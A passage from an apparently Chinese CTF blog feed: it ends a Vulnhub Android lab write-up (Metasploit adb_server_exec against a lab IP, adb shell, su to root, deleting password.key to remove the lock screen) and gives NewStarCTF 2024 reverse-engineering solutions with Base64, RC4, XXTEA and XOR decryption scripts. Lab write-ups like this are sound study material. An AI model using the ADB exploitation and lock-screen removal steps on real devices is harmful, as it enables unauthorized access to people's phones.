漏洞，找到一个远程命令执行漏洞</p><p><img src="https://img.dkdun.cn/v1/2024/12/921633b6f851291e.png"></p><p>调用模块，然后进行利用</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">use</span> exploit/android/adb/adb_server_exec<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> RHOSTS 192.168.88.138 （目标IP）<br><span class="hljs-built_in">set</span> LHOST 192.168.88.140 （本机IP）<br><span class="hljs-built_in">run</span> <br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2024/12/52fb8adc6fe57576.png"></p><p>adb 连接，直接 getshell</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">adb</span> <span class="hljs-number">192.168.88.140</span><br>adb shell<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2024/12/2f0c334bc0eefed1.png"></p><p>但是是普通权限，那么直接 <code>su</code> 进入 root 权限</p><p><img src="https://img.dkdun.cn/v1/2024/12/12e806c87ee042bd.png"></p><p>列出当前路径下的文件，访问 <code>data</code> 目录（Android 中重要的存储数据的目录，存储着用户的所有程序相关数据），发现有 root，进入得到 flag</p><p><img src="https://img.dkdun.cn/v1/2024/12/a11f4b548e67a0b2.png"></p><p>得到</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">flag:</span> ANDROID&#123;u_GOT_root_buddy&#125;<br></code></pre></td></tr></table></figure><p>来都来了，尝试着破解一下密码，进入</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell">/<span class="hljs-class"><span class="hljs-keyword">data</span>/system/</span><br></code></pre></td></tr></table></figure><p>发现了 <code>password.key</code> </p><p><img src="https://img.dkdun.cn/v1/2024/12/f844809cb8685583.png"></p><p>使用最朴素的破解办法，那就是 —- 直接给他删了（嘻嘻）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> password.key<br></code></pre></td></tr></table></figure><p>删除之后打开靶机界面，直接 enter 就解锁了</p><p><img src="https://img.dkdun.cn/v1/2024/12/b192013003c50db4.png"></p><p>通过查找资料，又学习到了一些东西，我心甚慰，喜欢这样的自己 ：）</p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
      <category>靶机</category>
      
      <category>Vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NewStarCTF 2024 Week3</title>
    <link href="/2024/11/29/Week3/"/>
    <url>/2024/11/29/Week3/</url>
    
    <content type="html"><![CDATA[<p>不行，我好菜啊TT</p><p>更一下，自由支配的时间好少（</p><p>时隔半个多月，我终于小有时间更新了！！！</p><span id="more"></span><h1 id="simpleAndroid"><a href="#simpleAndroid" class="headerlink" title="simpleAndroid"></a>simpleAndroid</h1><p>按照老方法看 <code>.xml</code> 里 的 <code>activity</code> 内容找主函数</p><p>经过 <code>CheckRoot.check()</code> 判断后将正确结果返回，然后跳转到 <code>CheckActivity</code> </p><p><img src="https://img.dkdun.cn/v1/2024/12/71863c1f53ad4f50.png"></p><p>用 <code>isValidInput()</code> 来输入的格式进行检测，长度必须为 24 ，形式以 <code>flag&#123;</code> 开头 <code>&#125;</code> 结尾，然后通过 <code>CheckData</code> 来进行比较</p><p>可以看到一个熟悉的 <code>native</code>，说明这个方法属于 <code>native</code> 层，需要去逆 <code>so</code> 文件了</p><p><img src="https://img.dkdun.cn/v1/2024/12/514232c5e71d14b0.png"></p><p>看了下 wp 居然可以直接改后缀为 <code>.zip</code> 找 <code>so</code> 文件！！！那所有 apk 文件都可以吗？！下次遇到试试这样走捷径(bushi)</p><p>搜索 <code>CheckData</code> 函数</p><p><img src="https://img.dkdun.cn/v1/2024/12/ec471833977c7734.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">  Class = _JNIEnv::FindClass(a1, <span class="hljs-string">&quot;com/example/simpleandroid/UseLess&quot;</span>);<br><span class="hljs-comment">//寻找 Java 的 UseLess 类</span><br>  StaticFieldID = _JNIEnv::GetStaticFieldID(a1, Class, <span class="hljs-string">&quot;CHAR_DATA&quot;</span>, <span class="hljs-string">&quot;Ljava/lang/String;&quot;</span>);<br><span class="hljs-comment">//通过 GetStaticFieldID 获取到了字段 CHAR_DATA 的 jfileID </span><br>  v27 = _JNIEnv::NewStringUTF(a1, <span class="hljs-string">&quot;BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/A&quot;</span>);<br><span class="hljs-comment">//创建的新的 jString 类型字符串</span><br>  _JNIEnv::SetStaticObjectField(a1, Class, StaticFieldID, v27);<br><span class="hljs-comment">//通过 SetStaticObjectField 把 v27 赋值给 Java 的 CHAR_DATA 字段</span><br><span class="hljs-comment">//修改了 Java 层的 UseLess 的 CHAR_DATA 字段</span><br><br>  StaticMethodID = _JNIEnv::GetStaticMethodID(a1, Class, <span class="hljs-string">&quot;func&quot;</span>, <span class="hljs-string">&quot;(Ljava/lang/String;)Ljava/lang/String;&quot;</span>);<br><span class="hljs-comment">//获取 Java 层函数 func 的 jmethodID </span><br>  v9 = <span class="hljs-number">0</span>;<br>  v25 = _JNIEnv::CallStaticObjectMethod((_DWORD)a1, Class, StaticMethodID, v30, v3, v4, v7[<span class="hljs-number">0</span>]);<br><span class="hljs-comment">//通过 CallStaticObjectMethod 将输入的 v30 传入 func 函数 </span><br>  StringUTFChars = _JNIEnv::GetStringUTFChars(a1, v25, <span class="hljs-number">0LL</span>);<br><span class="hljs-comment">//将上面函数调用的返回值赋给了 StringUTFChars</span><br><span class="hljs-comment">//把输入作为参数传给了 Java 层的 func 函数，得到返回值</span><br></code></pre></td></tr></table></figure><p>回到 jad-gui 看 <code>UseLess</code> 类，流程可以看出来进行 Base64 的变换，因为 <code>so</code> 对于 <code>CHAR_DATA</code> 进行了更改，所以这里是一个换表的 Base64</p><p><img src="https://img.dkdun.cn/v1/2024/12/f4fb59bd9b159a1a.png"></p><p>输入首先经过换表 Base64 的变化，进入 <code>so</code> 加密。首先前后交换位置，再进行循环右移 4 位的操作，最后和<code>data_1</code> 进行比较。</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs smali">v35 = StringUTFChars;//base64 的结果赋值<br>v34 = -1<span class="hljs-class">LL;</span><br>v23 = __strlen_chk(StringUTFChars, -1<span class="hljs-class">LL);</span><br>v10 = v23;<br>v22 = v7;<br>v11 = &amp;v7[-((v23 + 15<span class="hljs-class">LL) &amp; 0xFFFFFFFFFFFFFFF0LL)];</span><br>v21 = v23;<br>for ( i = 0; i &lt; (int)v23; ++i )<br>  v11[i] = *(_BYTE *)(StringUTFChars + i);<br>for ( j = 0; ; ++j )<br>&#123;<br>  v8 = j;<br> <span class="hljs-built_in"> if </span>( j &gt;= (int)v23 / 2 )<br>    break;<br>  v5 = v11;<br>  v18 = v11[j];<br>  v11[j] = v11[v23 - j - 1];<br>  v5[v23 - j - 1] = v18;//将 v11[j] 和 v11[v23-j-1] 交换位置<br>&#125;<br>v17 = v11;<br>v16 = v11;<br>v15 = &amp;v11[v10];<br>while ( v16 != v15 )<br>&#123;<br>  v14 = v16;<br>  *v16 = ((int)(unsigned __int8)*v16 &gt;&gt; 4) | (16 * *v16);//循环右移 4 位<br>  ++v16;<br>&#125;<br>for ( k = 0; k &lt; (int)v23; ++k )<br>&#123;<br> <span class="hljs-built_in"> if </span>( (unsigned __int8)v11[k] != data_1[k] )<br>  &#123;<br>    v33 = 0;<br>    v12 = 1;<br>   <span class="hljs-built_in"> return </span>v33;<br>  &#125;<br>&#125;<br>v33 = 1;<br>v12 = 1;<span class="hljs-built_in"></span><br><span class="hljs-built_in">return </span>v33;<br></code></pre></td></tr></table></figure><p>所以逆向流程就是：循环移动 -&gt; 交换位置 -&gt; base64</p><p>将 <code>data_1</code> 数据提取出来</p><p><img src="https://img.dkdun.cn/v1/2024/12/cfa0a4036c1e3ed4.png"></p><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>result = <span class="hljs-string">&quot;&quot;</span><br>enc = [<span class="hljs-number">0xB2</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xF4</span>,<br>       <span class="hljs-number">0x43</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x36</span>,<br>       <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x97</span>,<br>       <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x16</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>    enc[i] = (enc[i] &lt;&lt; <span class="hljs-number">4</span> | enc[i] &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0xff</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)//<span class="hljs-number">2</span>):<br>    tmp = enc[i]<br>    enc[i] = enc[<span class="hljs-built_in">len</span>(enc) - i - <span class="hljs-number">1</span>]<br>    enc[<span class="hljs-built_in">len</span>(enc) - i - <span class="hljs-number">1</span>] = tmp<br><br>result = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(a) <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> enc])<br>CHAR_DATA = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br>NewStringUTF = <span class="hljs-string">&quot;BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/A&quot;</span><br><span class="hljs-built_in">print</span>(base64.b64decode(result.translate(<span class="hljs-built_in">str</span>.maketrans(NewStringUTF, CHAR_DATA))))<br><br>&gt;&gt;<span class="hljs-string">b&#x27;flag&#123;android_is_simple!&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="SecertsOfKawaii"><a href="#SecertsOfKawaii" class="headerlink" title="SecertsOfKawaii"></a>SecertsOfKawaii</h1><p>查看 <code>MainActivity</code> 代码，看起来好像被混淆了，乱乱的</p><p><img src="https://img.dkdun.cn/v1/2024/12/8d9abae0ff32d920.png"></p><p>可以使用 jeb 去混淆，解析成 Java 代码（怎么这些工具这么强啊啊啊啊）</p><p><img src="https://img.dkdun.cn/v1/2024/12/996d02236c2e81ab.png"></p><p>往下看代码流程，Java 层有一个 <code>RC4</code> 加密，<code>key</code>是 <code>rc4k4y</code>，加密后 <code>Base64</code> 一下传到 <code>so</code> 层，值在 <code>so</code> 层检查</p><p><img src="https://img.dkdun.cn/v1/2024/12/e545a4d1493aea08.png"></p><p><code>so</code> 文件有壳（以后都会记住要先查壳了），脱壳查看</p><p><img src="https://img.dkdun.cn/v1/2024/12/ce34a0c04606ef30.png"></p><p>xxtea（讨厌 tea 系列！！！），密钥是 <code>meow~meow~tea~~~</code></p><p><img src="https://img.dkdun.cn/v1/2024/12/7dfbf02378d099da.png"></p><p>所以整个流程就是： xxtea -&gt; base64 -&gt; rc4 </p><p> 写 exp</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-type">uint32_t</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELTA 0xdeadbeef</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MX (((z &gt;&gt; 5 ^ y <span class="hljs-string">&lt;&lt; 3) + (y &gt;</span>&gt; 3 ^ z &lt;&lt; 2)) ^ ((sum ^ y) + (key[(p &amp; 3) ^ e] ^ z)))</span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> sbox[<span class="hljs-number">257</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br><br><span class="hljs-comment">//初始化 s 盒</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">init_sbox</span><span class="hljs-params">(<span class="hljs-type">char</span> *key)</span></span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i,j,k;<br>    <span class="hljs-type">int</span> tmp;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">256</span>;i++)&#123;<br>        sbox[i]=i;<br>    &#125;<br>    j=k=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">256</span>;i++)&#123;<br>        tmp=sbox[i];<br>        j=(j+tmp+key[k])%<span class="hljs-number">256</span>;<br>        sbox[i]=sbox[j];<br>        sbox[j]=tmp;<br>        <span class="hljs-keyword">if</span>(++k&gt;=<span class="hljs-built_in">strlen</span>((<span class="hljs-type">char</span>*)key))<br>            k=<span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//解密rc4</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">rc4</span><span class="hljs-params">(<span class="hljs-type">char</span> *key, <span class="hljs-type">char</span> *data)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> i, j, k, R, tmp;<br><br>    <span class="hljs-built_in">init_sbox</span>(key);<br><br>    j = k = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>((<span class="hljs-type">char</span> *)data); i++)<br>    &#123;<br>        j = (j + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>;<br>        k = (k + sbox[j]) % <span class="hljs-number">256</span>;<br><br>        tmp = sbox[j];<br>        sbox[j] = sbox[k];<br>        sbox[k] = tmp;<br><br>        R = sbox[(sbox[j] + sbox[k]) % <span class="hljs-number">256</span>];<br><br>        data[i] ^= R;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//解密 tea</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">btea</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> *v, <span class="hljs-type">int</span> n, <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> key[<span class="hljs-number">4</span>])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">uint32_t</span> y, z, sum;<br>    <span class="hljs-type">unsigned</span> p, rounds, e;<br>    <span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">1</span>)<br>    &#123;<br>        rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / n;<br>        sum = <span class="hljs-number">0</span>;<br>        z = v[n - <span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">do</span><br>        &#123;<br>            sum += DELTA;<br>            e = (sum &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;<br>            <span class="hljs-keyword">for</span> (p = <span class="hljs-number">0</span>; p &lt; n - <span class="hljs-number">1</span>; p++)<br>            &#123;<br>                y = v[p + <span class="hljs-number">1</span>];<br>                z = v[p] += MX;<br>            &#125;<br>            y = v[<span class="hljs-number">0</span>];<br>            z = v[n - <span class="hljs-number">1</span>] += MX;<br>        &#125; <span class="hljs-keyword">while</span> (--rounds);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">-1</span>)<br>    &#123;<br>        n = -n;<br>        rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / n;<br>        sum = rounds * DELTA;<br>        y = v[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">do</span><br>        &#123;<br>            e = (sum &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;<br>            <span class="hljs-keyword">for</span> (p = n - <span class="hljs-number">1</span>; p &gt; <span class="hljs-number">0</span>; p--)<br>            &#123;<br>                z = v[p - <span class="hljs-number">1</span>];<br>                y = v[p] -= MX;<br>            &#125;<br>            z = v[n - <span class="hljs-number">1</span>];<br>            y = v[<span class="hljs-number">0</span>] -= MX;<br>            sum -= DELTA;<br>        &#125; <span class="hljs-keyword">while</span> (--rounds);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//base解密</span><br><span class="hljs-type">char</span> base64[<span class="hljs-number">65</span>] = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">decodeBase64</span><span class="hljs-params">(<span class="hljs-type">char</span> *str, <span class="hljs-type">int</span> len, <span class="hljs-type">char</span> **in)</span></span><br><span class="hljs-function"></span>&#123;<br><br>    <span class="hljs-type">char</span> ascill[<span class="hljs-number">129</span>];<br>    <span class="hljs-type">int</span> i,k = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">64</span>; i++)<br>    &#123;<br>        ascill[base64[i]] = k++;<br>    &#125;<br>    <span class="hljs-type">int</span> decodeStrlen = len / <span class="hljs-number">4</span> * <span class="hljs-number">3</span> + <span class="hljs-number">1</span>;<br>    <span class="hljs-type">char</span> *decodeStr= (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">char</span>) * decodeStrlen);<br>    k = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; len; i++)<br>    &#123;<br>        decodeStr[k++] = (ascill[str[i]] &lt;&lt; <span class="hljs-number">2</span>) | (ascill[str[++i]] &gt;&gt; <span class="hljs-number">4</span>);<br>        <span class="hljs-keyword">if</span> (str[i + <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;=&#x27;</span>)<br>        &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        decodeStr[k++] = (ascill[str[i]] &lt;&lt; <span class="hljs-number">4</span>) | (ascill[str[++i]] &gt;&gt; <span class="hljs-number">2</span>);<br>        <span class="hljs-keyword">if</span> (str[i + <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;=&#x27;</span>)<br>        &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        decodeStr[k++] = (ascill[str[i]] &lt;&lt; <span class="hljs-number">6</span>) | (ascill[str[++i]]);<br>    &#125;<br>    decodeStr[k] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    *in = decodeStr;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> secrets[<span class="hljs-number">6</span>] =<br>            &#123;<span class="hljs-comment">//secrets数组</span><br>                    <span class="hljs-number">6866935238662214623LL</span>,<br>                    <span class="hljs-number">3247821795433987330LL</span>,<br>                    <span class="hljs-number">-3346872833356453065LL</span>,<br>                    <span class="hljs-number">1628153154909259154LL</span>,<br>                    <span class="hljs-number">-346581578535637655LL</span>,<br>                    <span class="hljs-number">3322447116203995091LL</span><br>            &#125;;<br>    <span class="hljs-built_in">btea</span>((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)secrets, <span class="hljs-number">-12</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)<span class="hljs-string">&quot;meow~meow~tea~~~&quot;</span>);<br>    <span class="hljs-type">char</span> *flag;<br>    <span class="hljs-built_in">decodeBase64</span>((<span class="hljs-type">char</span> *)secrets, <span class="hljs-built_in">strlen</span>((<span class="hljs-type">char</span> *)secrets), &amp;flag);<br>    <span class="hljs-built_in">rc4</span>(<span class="hljs-string">&quot;rc4k4y&quot;</span>, (<span class="hljs-type">char</span> *)flag);<br>    <span class="hljs-built_in">puts</span>(flag);<br>&#125;<br></code></pre></td></tr></table></figure><p>好难好难好难 (((((T__T)))))</p><h1 id="PangBai-过家家（3）"><a href="#PangBai-过家家（3）" class="headerlink" title="PangBai 过家家（3）"></a>PangBai 过家家（3）</h1><p>发现附件是一个 python 编译的可执行文件，PyInstaller 是一个能把 <code>.py</code> 脚本打包成 <code>.exe</code> 的 python 库。</p><p><img src="https://img.dkdun.cn/v1/2024/12/fd9150cdeb260c60.png"></p><p>给它解包，可以使用 pyinstaller Extractor 进行解包。前提：1. 使用 pyinstaller 进行打包。2. 未加密</p><p>解包后文件放在以 exe 名字 +_extracted 的文件夹中</p><p><img src="https://img.dkdun.cn/v1/2024/12/0a2592d5412198ae.png"></p><p>找到和程序同名的 <code>NotNormalExe.pyc</code> 这个文件，用的 <a href="https://pylingual.io/">https://pylingual.io</a> 反编译它，反编译结果如下</p><p><img src="https://img.dkdun.cn/v1/2024/12/492a93c4478014b6.png"></p><p>就是一个简单的异或，重点是要解包反编译出来源码</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">enc = [<span class="hljs-number">40</span>, <span class="hljs-number">9</span>, <span class="hljs-number">22</span>, <span class="hljs-number">52</span>, <span class="hljs-number">15</span>, <span class="hljs-number">56</span>, <span class="hljs-number">66</span>, <span class="hljs-number">71</span>, <span class="hljs-number">111</span>, <span class="hljs-number">121</span>,<br>       <span class="hljs-number">90</span>, <span class="hljs-number">33</span>, <span class="hljs-number">18</span>, <span class="hljs-number">40</span>, <span class="hljs-number">3</span>, <span class="hljs-number">13</span>, <span class="hljs-number">80</span>, <span class="hljs-number">28</span>, <span class="hljs-number">65</span>, <span class="hljs-number">68</span>, <span class="hljs-number">83</span>,<br>       <span class="hljs-number">88</span>, <span class="hljs-number">34</span>, <span class="hljs-number">86</span>, <span class="hljs-number">5</span>, <span class="hljs-number">12</span>, <span class="hljs-number">35</span>, <span class="hljs-number">82</span>, <span class="hljs-number">67</span>, <span class="hljs-number">3</span>, <span class="hljs-number">17</span>, <span class="hljs-number">79</span><br>       ]<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>key = <span class="hljs-string">&#x27;NewStar2024&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>     enc[i] ^= <span class="hljs-built_in">ord</span>(key[i % <span class="hljs-built_in">len</span>(key)])<br>     flag += <span class="hljs-built_in">chr</span>(enc[i])<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>只关于 Reverse</category>
      
      <category>赛题复现</category>
      
      <category>NewStarCTF 2024</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackMyVM-slackware</title>
    <link href="/2024/11/12/HackMyVM-slackware/"/>
    <url>/2024/11/12/HackMyVM-slackware/</url>
    
